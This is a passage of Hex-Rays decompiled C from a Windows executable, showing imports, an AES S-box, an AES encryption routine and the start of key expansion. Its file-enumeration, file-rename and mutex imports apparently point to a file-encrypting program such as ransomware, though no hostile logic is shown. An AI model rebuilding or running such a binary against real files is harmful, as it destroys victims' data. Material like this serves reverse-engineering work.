/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_401000(unsigned __int8 *a1, int a2);
char __fastcall sub_401250(int a1, unsigned int a2, char *a3, __int128 *a4, __int128 *a5);
void *sub_401480();
int sub_401490(int a1, ...);
BOOL __thiscall sub_4014D0(_WORD *this);
HANDLE __thiscall sub_401660(WCHAR *this);
HANDLE __thiscall sub_401A90(const WCHAR *this);
DWORD __stdcall StartAddress(int *lpThreadParameter);
void sub_4021A0();
int __fastcall sub_402280(int a1, unsigned int a2);
char __fastcall sub_4022E0(char a1);
void *__cdecl sub_402370(SIZE_T dwBytes, int a2);
BOOL __cdecl sub_4023D0(LPVOID lpMem);
int __fastcall sub_4023F0(unsigned int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5);
// _DWORD *__usercall sub_402560@<eax>(_BYTE *a1@<edx>, int a2@<ecx>, unsigned int a3@<ebp>, unsigned int a4);
void __fastcall sub_403560(int a1, _DWORD *a2);
// int __usercall sub_4035E0@<eax>(int a1@<ebx>, DWORD *a2@<edi>, int a3@<esi>);
int __cdecl main(int argc, const char **argv, const char **envp);
int __thiscall sub_403CA0(_BYTE *this);
int __thiscall sub_403CB0(_WORD *this);
_WORD *__fastcall sub_403CC0(int a1, int a2);
_WORD *__fastcall sub_403CE0(_WORD *a1, __int16 *a2);
DWORD __thiscall sub_403D10(LPCWSTR lpFileName);
_DWORD *__fastcall sub_403DA0(__int16 *a1, _DWORD *a2);
_BYTE *__thiscall sub_403EE0(_WORD *this);
// BOOL __usercall sub_403F60@<eax>(int a1@<edi>);
int sub_404334();
int sub_40433C();
int __cdecl UserMathErrorFunction();
int sub_4047C6();
void sub_4047D0();
char sub_4047DC();
void *sub_404803();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_404826();
void *sub_404832();
void *sub_404838();
LPTOP_LEVEL_EXCEPTION_FILTER sub_4049A0();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_404A02();
void sub_404A0A();
void __cdecl sub_404A36(); // idb
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// FILE *__cdecl __acrt_iob_func(unsigned int Ix);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD); weak
// _DWORD __stdcall unknown_libname_3(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_4(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl sub_406670(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// _DWORD __stdcall unknown_libname_8(_DWORD); weak
char __thiscall sub_406B6A(void *this);
char __thiscall sub_406B89(int this);
// _DWORD __stdcall unknown_libname_10(_DWORD); weak
char __thiscall sub_406C30(int this);
char __thiscall sub_406C56(_BYTE *this);
char __thiscall sub_406DA4(int this);
char __thiscall sub_406FD6(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_11(_DWORD); weak
// int __thiscall unknown_libname_12(_DWORD); weak
// _DWORD __stdcall sub_4071FE(_DWORD); weak
char __thiscall sub_40728E(int this, int a2, char a3);
// int __thiscall unknown_libname_13(_DWORD); weak
char __thiscall sub_407453(_DWORD *this);
char __thiscall sub_407472(_DWORD *this);
// int __thiscall unknown_libname_14(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char); weak
// _DWORD __stdcall unknown_libname_16(_DWORD); weak
// _DWORD __stdcall sub_407680(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40776C(int a1, int a2, int a3, int a4, int a5, int a6);
int sub_407947();
int __cdecl sub_40794D(int a1);
int __cdecl sub_407993(int a1);
int sub_407CF0();
// int common_initialize_environment_nolock<char>(void); weak
// int __cdecl unknown_libname_18(void *Block); idb
// int initialize_environment_by_cloning_nolock<char>(void); weak
void *__cdecl sub_407F1A(void **a1);
void *__cdecl sub_407F35(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_40824B(int a1);
// void __cdecl __noreturn _exit(int Code);
int *sub_408320();
void **sub_408326();
__int32 sub_40839A();
int sub_40842E();
// int __cdecl _set_new_mode(int NewMode);
void *sub_408464();
int __stdcall sub_40846A(_DWORD *a1, int a2, _DWORD *a3);
int __stdcall sub_4084C5(_DWORD *a1, int a2, _DWORD *a3);
// int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD); weak
// int __thiscall unknown_libname_21(_DWORD); weak
int __cdecl sub_408723(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4087C2();
char sub_4087E9();
__vcrt_bool sub_40881F();
// void __cdecl __noreturn abort();
int __cdecl sub_408F3B(int a1);
// void __cdecl _invalid_parameter_noinfo();
// _DWORD __cdecl __acrt_errno_map_os_error(_DWORD); weak
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// void __cdecl _free_base(void *Block);
int sub_40914A();
int sub_409164();
// int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_4092C8(int a1);
int __stdcall sub_4094CE(wchar_t *a1, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest, int a7, int a8, int a9); // idb
// int __stdcall __acrt_LocaleNameToLCID(wchar_t *, int); idb
// int __cdecl common_flush_all(bool); idb
int sub_4098F2();
// void *__cdecl _malloc_base(size_t Size);
// int __cdecl mbtowc(wchar_t *DstCh, const char *SrcCh, size_t SrcSizeInBytes);
// int __acrt_getptd(void); weak
// int __acrt_getptd_noexit(void); weak
struct __crt_locale_data *__cdecl sub_40A6FA(int a1, struct __crt_locale_data **a2);
struct __crt_multibyte_data *__cdecl sub_40A727(int a1, struct __crt_multibyte_data **a2);
int __cdecl sub_40A7B6(double *a1, char *Str, unsigned int a3, char *a4, unsigned int a5, signed int Size, unsigned __int8 a7, unsigned int a8, struct __crt_locale_pointers *a9);
// int __cdecl fp_format_e(const double *const, char *const, unsigned int, char *const, unsigned int, int, bool, unsigned int, struct __crt_locale_pointers *const); idb
// _DWORD __cdecl sub_40B0DA(_DWORD); weak
char __cdecl sub_40B13F(FILE *a1);
// int __cdecl __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *, int, UINT CodePage); idb
int __cdecl sub_40B2F6(LPCWCH lpWideCharStr, struct __crt_win32_buffer_empty_debug_info *a2, int a3, UINT CodePage); // idb
int __cdecl sub_40B3C5(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *a2, UINT CodePage); // idb
// int __thiscall unknown_libname_26(_DWORD); weak
int __thiscall sub_40B932(void **this, size_t Size);
int __thiscall sub_40B96E(void **this, int a2);
// int __cdecl __crt_win32_buffer_internal_dynamic_resizing::allocate(void **const, size_t Size, const struct __crt_win32_buffer_empty_debug_info *); idb
// struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(struct __acrt_ptd *const, struct __crt_multibyte_data **const); idb
struct __crt_multibyte_data *sub_40C167();
// int __cdecl __acrt_WideCharToMultiByte(UINT CodePage, int, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, int, int); idb
// _DWORD __cdecl copy_environment<char>(_DWORD); weak
int sub_40C92F();
// _DWORD __cdecl __acrt_lock(_DWORD); weak
// _DWORD __cdecl __acrt_unlock(_DWORD); weak
// _DWORD __cdecl __acrt_lowio_lock_fh(_DWORD); weak
// _DWORD __cdecl __acrt_lowio_unlock_fh(_DWORD); weak
// const unsigned __int16 *__cdecl __pctype_func();
int sub_40D39C();
// _DWORD __cdecl _updatetlocinfoEx_nolock(_DWORD, _DWORD); weak
char sub_40D4EB();
int __cdecl sub_40D58E(int a1);
// void (__cdecl **__cdecl get_global_action_nolock(int))(int); idb
// struct __crt_signal_action_t *__cdecl siglookup(int, struct __crt_signal_action_t *const); idb
// int *__cdecl __fpecode();
int __cdecl sub_40D742(int a1);
DWORD *__cdecl sub_40E1C2(DWORD *a1, int a2, char *a3, int a4);
// int __cdecl write_double_translated_unicode_nolock(_DWORD, _DWORD, _DWORD); weak
// bool __cdecl write_requires_double_translation_nolock(int FileHandle); idb
// int __cdecl write_text_ansi_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl write_text_utf16le_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl write_text_utf8_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40E93B(int FileHandle, const void *a2, int a3);
int __cdecl sub_40EA2D(int FileHandle, const void *a2, int a3);
// unsigned int __cdecl __crt_mbstring::__mbsrtowcs_utf8(__crt_mbstring *__hidden this, wchar_t *, const char **, unsigned int, struct _Mbstatet *); idb
// _DWORD __cdecl sub_410722(_DWORD, _DWORD); weak
int __cdecl sub_410988(int a1, int a2);
// int __cdecl _isatty(int FileHandle);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_411687(int a1);
// int __cdecl _lseeki64_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod); idb
// void __cdecl __dcrt_lowio_initialize_console_output(); idb
BOOL sub_412308();
unsigned int __cdecl sub_4125D5(unsigned int a1);
// void __usercall sub_412BD4(char a1@<ch>, int a2@<ebp>);
// int _ffexpm1(void); weak
// int isintTOS(void); weak
// char *__cdecl strrchr(const char *Str, int Ch);
// unsigned __int64 __usercall sub_414D43@<edx:eax>(unsigned __int64 a1@<edx:eax>);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLastError)();
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern int (__stdcall *LCMapStringW)(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// extern UINT (__stdcall *GetConsoleCP)();
_UNKNOWN unk_41644C; // weak
_UNKNOWN unk_416464; // weak
_UNKNOWN unk_416480; // weak
char RijnDael_AES_LONG_41A710[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '€',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
char byte_41A810[12] =
{
  '\x8D',
  '\x01',
  '\x02',
  '\x04',
  '\b',
  '\x10',
  ' ',
  '@',
  '€',
  '\x1B',
  '6',
  '\0'
}; // weak
char byte_41A878[] = { 'Q' }; // weak
char byte_41B984[] = { 'd' }; // weak
char byte_41B998[] = { 'd' }; // weak
uintptr_t __security_cookie = 3141592654u;
int dword_41D00C = 1; // weak
wchar_t *off_41D138 = L"         (((((                  H"; // weak
int dword_41D778 = -2; // weak
char byte_41D788[264] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
HANDLE hConsoleOutput = (HANDLE)0xFFFFFFFE; // idb
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_41DBF8; // weak
int dword_41DC00; // weak
int dword_41DCC0; // weak
int dword_41DCC4; // weak
int dword_41DCC8; // weak
int dword_41DDD8; // weak
int dword_41DDDC; // weak
void *dword_41DDE0; // idb
void *dword_41DDE4; // idb
int dword_41DDEC; // weak
int dword_41DDF8; // weak
void *dword_41DDFC; // idb
int dword_41DE0C; // weak
int dword_41DE10; // weak
_UNKNOWN unk_41DE14; // weak
_onexit_table_t stru_41DE18; // idb
int dword_41DE30; // weak
int dword_41DF10[128]; // weak
int dword_41E110; // weak
void *dword_41E120; // idb
void *dword_41E124; // idb
struct __crt_locale_data *dword_41E128; // idb
struct __crt_multibyte_data *dword_41E134; // idb
HANDLE hHeap; // idb
int dword_41E2A4; // weak
_UNKNOWN unk_41E2C8; // weak
int dword_41E2D0; // weak
int dword_41E2D4; // weak
LPCVOID lpBuffer; // idb
int dword_41E2DC; // weak
DWORD dwBytes; // idb
int dword_41E2E4; // weak
int dword_41E2E8; // weak
int dword_41E2EC; // weak
LPCSTR lpName; // idb
int dword_41E310; // weak
int dword_41E314; // weak
HMODULE hModule; // idb
int dword_41E31C; // weak
HMODULE dword_41E320; // idb
HMODULE dword_41E324; // idb
HMODULE dword_41E328; // idb
int dword_41E32C; // weak
HMODULE dword_41E330; // idb
int dword_41E334; // weak
_UNKNOWN unk_41E33C; // weak
_UNKNOWN unk_41E340; // weak


//----- (00401000) --------------------------------------------------------
int __fastcall sub_401000(unsigned __int8 *a1, int a2)
{
  int v2; // ebx
  unsigned __int8 *v3; // edi
  int v4; // esi
  int v5; // edx
  unsigned __int8 *v6; // ebx
  unsigned __int8 *v7; // ecx
  int v8; // edx
  int v9; // eax
  int v10; // esi
  unsigned __int8 v11; // cl
  unsigned __int8 v12; // al
  unsigned __int8 v13; // cl
  unsigned __int8 v14; // al
  unsigned __int8 v15; // cl
  unsigned __int8 v16; // al
  unsigned __int8 v17; // cl
  _BYTE *v18; // edi
  char v19; // bh
  char v20; // ch
  char v21; // dl
  char v22; // dh
  int v23; // ebx
  char *v24; // esi
  unsigned __int8 *v25; // eax
  int v26; // edx
  char v27; // cl
  unsigned __int8 *v28; // esi
  int v29; // ebx
  unsigned __int8 *v30; // ecx
  int v31; // edx
  int v32; // eax
  unsigned __int8 v33; // cl
  int v34; // esi
  unsigned __int8 v35; // al
  unsigned __int8 v36; // cl
  unsigned __int8 v37; // al
  unsigned __int8 v38; // cl
  unsigned __int8 v39; // al
  unsigned __int8 v40; // cl
  int result; // eax
  _BYTE *v42; // ecx
  int v43; // edx
  unsigned __int8 *v44; // [esp+Ch] [ebp-18h]
  int v46; // [esp+14h] [ebp-10h]
  char *v47; // [esp+18h] [ebp-Ch]
  int v48; // [esp+1Ch] [ebp-8h]
  char v49; // [esp+23h] [ebp-1h]

  v2 = 4;
  v3 = a1;
  v44 = a1;
  v4 = a2 - (_DWORD)a1;
  do
  {
    v5 = 4;
    do
    {
      *a1 ^= a1[v4];
      ++a1;
      --v5;
    }
    while ( v5 );
    --v2;
  }
  while ( v2 );
  v46 = 9;
  v47 = (char *)(a2 + 16);
  do
  {
    v6 = v3;
    v48 = 4;
    do
    {
      v7 = v6;
      v8 = 4;
      do
      {
        v9 = *v7;
        v7 += 4;
        *(v7 - 4) = RijnDael_AES_LONG_41A710[v9];
        --v8;
      }
      while ( v8 );
      ++v6;
      --v48;
    }
    while ( v48 );
    v10 = 4;
    v11 = v3[1];
    v3[1] = v3[5];
    v3[5] = v3[9];
    v3[9] = v3[13];
    v12 = v3[10];
    v3[13] = v11;
    v13 = v3[2];
    v3[2] = v12;
    v14 = v3[14];
    v3[10] = v13;
    v15 = v3[6];
    v3[6] = v14;
    v16 = v3[15];
    v3[14] = v15;
    v17 = v3[3];
    v3[3] = v16;
    v3[15] = v3[11];
    v3[11] = v3[7];
    v3[7] = v17;
    v18 = v3 + 2;
    do
    {
      v19 = v18[1];
      v18 += 4;
      v20 = *(v18 - 4);
      v21 = *(v18 - 5);
      v49 = *(v18 - 6);
      v22 = v21 ^ v49 ^ v20 ^ v19;
      *(v18 - 6) = v22 ^ v49 ^ (2 * (v21 ^ v49)) ^ (27 * ((unsigned __int8)(v21 ^ v49) >> 7));
      *(v18 - 5) = v22 ^ v21 ^ (2 * (v20 ^ v21)) ^ (27 * ((unsigned __int8)(v20 ^ v21) >> 7));
      *(v18 - 4) = v22 ^ v20 ^ (2 * (v20 ^ v19)) ^ (27 * ((unsigned __int8)(v20 ^ v19) >> 7));
      *(v18 - 3) = v22 ^ v19 ^ (2 * (v19 ^ v49)) ^ (27 * ((unsigned __int8)(v19 ^ v49) >> 7));
      --v10;
    }
    while ( v10 );
    v3 = v44;
    v23 = 4;
    v24 = v47;
    v25 = v44;
    do
    {
      v26 = 4;
      do
      {
        v27 = *v24++;
        *v25++ ^= v27;
        --v26;
      }
      while ( v26 );
      v47 = v24;
      --v23;
    }
    while ( v23 );
    --v46;
  }
  while ( v46 );
  v28 = v44;
  v29 = 4;
  do
  {
    v30 = v28;
    v31 = 4;
    do
    {
      v32 = *v30;
      v30 += 4;
      *(v30 - 4) = RijnDael_AES_LONG_41A710[v32];
      --v31;
    }
    while ( v31 );
    ++v28;
    --v29;
  }
  while ( v29 );
  v33 = v44[1];
  v34 = 4;
  v44[1] = v44[5];
  v44[5] = v44[9];
  v44[9] = v44[13];
  v35 = v44[10];
  v44[13] = v33;
  v36 = v44[2];
  v44[2] = v35;
  v37 = v44[14];
  v44[10] = v36;
  v38 = v44[6];
  v44[6] = v37;
  v39 = v44[15];
  v44[14] = v38;
  v40 = v44[3];
  v44[3] = v39;
  v44[15] = v44[11];
  result = v44[7];
  v44[7] = v40;
  v44[11] = result;
  v42 = (_BYTE *)(a2 + 160);
  do
  {
    v43 = 4;
    do
    {
      LOBYTE(result) = *v42++;
      *v3++ ^= result;
      --v43;
    }
    while ( v43 );
    --v34;
  }
  while ( v34 );
  return result;
}

//----- (00401250) --------------------------------------------------------
char __fastcall sub_401250(int a1, unsigned int a2, char *a3, __int128 *a4, __int128 *a5)
{
  unsigned int v5; // ebx
  __int128 *v6; // edi
  char *v7; // edx
  char v8; // ah
  char v9; // cl
  char v10; // ch
  unsigned int v11; // ebx
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  char v15; // cl
  char v16; // al
  char result; // al
  int v18; // ecx
  char v21; // [esp+15h] [ebp-C7h]
  char v22[13]; // [esp+18h] [ebp-C4h] BYREF
  char v23[163]; // [esp+25h] [ebp-B7h] BYREF
  __int128 v24; // [esp+C8h] [ebp-14h] BYREF

  v5 = 4;
  v22[0] = *a3;
  v22[1] = a3[1];
  v22[2] = a3[2];
  v22[3] = a3[3];
  v22[4] = a3[4];
  v22[5] = a3[5];
  v22[6] = a3[6];
  v22[7] = a3[7];
  v22[8] = a3[8];
  v22[9] = a3[9];
  v22[10] = a3[10];
  v22[11] = a3[11];
  v22[12] = a3[12];
  v23[0] = a3[13];
  v23[1] = a3[14];
  v6 = a5;
  v7 = v23;
  v23[2] = a3[15];
  do
  {
    v8 = *(v7 - 1);
    v9 = v7[1];
    v10 = v7[2];
    v21 = *v7;
    if ( (v5 & 3) == 0 )
    {
      v21 = RijnDael_AES_LONG_41A710[(unsigned __int8)v7[1]];
      v8 = RijnDael_AES_LONG_41A710[(unsigned __int8)*v7] ^ byte_41A810[v5 >> 2];
      v9 = RijnDael_AES_LONG_41A710[(unsigned __int8)v7[2]];
      v10 = RijnDael_AES_LONG_41A710[(unsigned __int8)*(v7 - 1)];
    }
    ++v5;
    v7[3] = v8 ^ *(v7 - 13);
    v7[4] = v21 ^ *(v7 - 12);
    v7[5] = v9 ^ *(v7 - 11);
    v7[6] = v10 ^ *(v7 - 10);
    v7 += 4;
  }
  while ( v5 < 0x2C );
  v11 = 0;
  v12 = 16;
  if ( a2 )
